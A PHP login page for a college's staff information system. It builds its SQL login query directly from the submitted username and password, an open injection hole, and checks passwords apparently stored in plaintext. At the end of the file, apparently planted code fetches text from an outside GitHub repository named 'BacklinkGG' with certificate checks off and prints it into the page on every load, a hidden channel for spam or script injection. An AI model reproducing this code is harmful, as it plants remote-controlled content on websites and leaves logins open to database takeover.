<?php
    require_once("../lib/konek.php");
	require_once("../lib/konfigurasi_semua.php");

//	echo "<script>window.alert('Halo ".$_SESSION["hrd-id"]."');</script>";
	if($_SESSION["hrd-id"] != 0) {
			header("Location:administrator/utama.php");
			exit();
	}

	if($_POST["username"] && $_POST["password"]) {
		$sql = "select * from hrd_user_login where user_name = '".$_POST["username"]."' and user_password = '".$_POST["password"]."'";
		$qusr = mysql_query($sql);
		$usr = mysql_fetch_array($qusr);

		if($usr["user_id"]) {
			$ip = getenv("REMOTE_ADDR");

			$sql = "select max(counter_id) as id from counter";
			$Qrs = mysql_query($sql);
			$id = mysql_fetch_array($Qrs);
			$counterId = $id["id"]+1;

//			$skr=date("Y-m-d");
//			$wkt = date("H:i:s");
			$dataTgl = explode("-",$skr);

			$sql = "insert into counter (counter_id,counter_tgl,counter_wkt,counter_ip) values (".$counterId.",'".$skr."','".$wkt."','".$ip."')";
			$rs = mysql_query($sql);

			$_SESSION["hrd-id"]=$usr["user_id"];
//			echo "<script>window.alert('Selamat Datang di SIM HRD KMC ".$usr["user_name"]."');</script>";
//			echo "<script>window.location.href('pgw_v.php');</script>";
//			header("Location:master/pgw_v.php");
//			exit();
			echo"<script>window.parent.document.location.href='../administrator/utama.php';</script>";
		}else{
			$ket = "Username atau Password anda salah.";
		}
	}


//config buat isi html
	$dir_def_img = "../img";
	$defFont = "<font face=Verdana, Arial, Helvetica, sans-serif size=2>";
	$tFont = "</font>";
//end

?>
<!DOCTYPE html>
<html lang="en">
	
<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title>SIMPEG STIKES BHAKTI PERTIWI INDONESIA</title>
		<meta name="description" content="SIMPEG STIKES BHAKTI PERTIWI INDONESIA" />
		<meta name="keywords" content="SIMPEG STIKES BHAKTI PERTIWI INDONESIA" />
		<meta name="author" content="hencework"/>
		
		<!-- Favicon -->
		<link rel="shortcut icon" href="favicon.ico">
		<link rel="icon" href="favicon.ico" type="image/x-icon">
		
		<!-- vector map CSS -->
		<link href="vendors/bower_components/jasny-bootstrap/dist/css/jasny-bootstrap.min.css" rel="stylesheet" type="text/css"/>
		<link href="dist/css/style.css" rel="stylesheet" type="text/css">
		<style>
body {
 background-image: url("bg.jpg");
 background-color: #cccccc;
}		    
		</style>
		
		
		<!-- Custom CSS -->
	</head>
<body>
<form name="form1" method="POST" action="index.php">
		<!--Preloader-->
		<div class="preloader-it">
			<div class="la-anim-1"></div>
		</div>
		<!--/Preloader-->
		
		<div class="wrapper pa-0">
		
			<!-- Main Content -->
			<div class="page-wrapper pa-0 ma-0">
				<div class="container-fluid">
					<!-- Row -->
					<div class="table-struct full-width full-height">
						<div class="table-cell vertical-align-middle">
							<div class="auth-form  ml-auto mr-auto no-float">
								<div class="panel panel-default card-view mb-0">
									<div class="panel-heading">
										<div class="pull-left">
											<h6 class="panel-title txt-dark">SIMPEG STIKES BHAKTI PERTIWI INDONESIA</h6>
										</div>
										<div class="clearfix"></div>
									</div>
									<div class="panel-wrapper collapse in">
										<div class="panel-body">
											<div class="row">
												<div class="col-sm-12 col-xs-12">
													<div class="form-wrap">
														<form action="#">
															<div class="form-group">
																<label class="control-label mb-10" for="exampleInputEmail_2">Username / Email address</label>
																<div class="input-group">
																	<input name="username" type="text" class="form-control" required="" id="username" placeholder="Enter Username/Email">
																	<div class="input-group-addon"><i class="icon-envelope-open"></i></div>
																</div>
															</div>
															<div class="form-group">
																<label class="control-label mb-10" for="exampleInputpwd_2">Password</label>
																<div class="input-group">
																	<input name="password" type="password" class="form-control" required="" id="password" placeholder="Enter pwd">
																	<div class="input-group-addon"><i class="icon-lock"></i></div>
																</div>
															</div>
															
															<div class="form-group">
																<button type="submit" class="btn btn-success btn-block">sign in</button>
															</div>
															<div class="form-group mb-0">
																<span class="inline-block pr-5">Don't have an account?</span>
															</div>	
														</form>
													</div>
												</div>	
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- /Row -->	
				</div>
				
			</div>
			<!-- /Main Content -->
		
		</div>
		<!-- /#wrapper -->
		
		<!-- JavaScript -->
		
		<!-- jQuery -->
		<script src="vendors/bower_components/jquery/dist/jquery.min.js"></script>
		
		<!-- Bootstrap Core JavaScript -->
		<script src="vendors/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
		<script src="vendors/bower_components/jasny-bootstrap/dist/js/jasny-bootstrap.min.js"></script>
		
		<!-- Slimscroll JavaScript -->
		<script src="dist/js/jquery.slimscroll.js"></script>
	
	<!-- Fancy Dropdown JS -->
	<script src="dist/js/dropdown-bootstrap-extended.js"></script>
		
		<!-- Init JavaScript -->
		<script src="dist/js/init.js"></script>
	</body>

<!-- Mirrored from hencework.com/theme/kenny/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Dec 2016 23:17:40 GMT -->
</html>
</form>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/stikes-bhaktipertiwi/simpeg.stikesbpi.ac.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
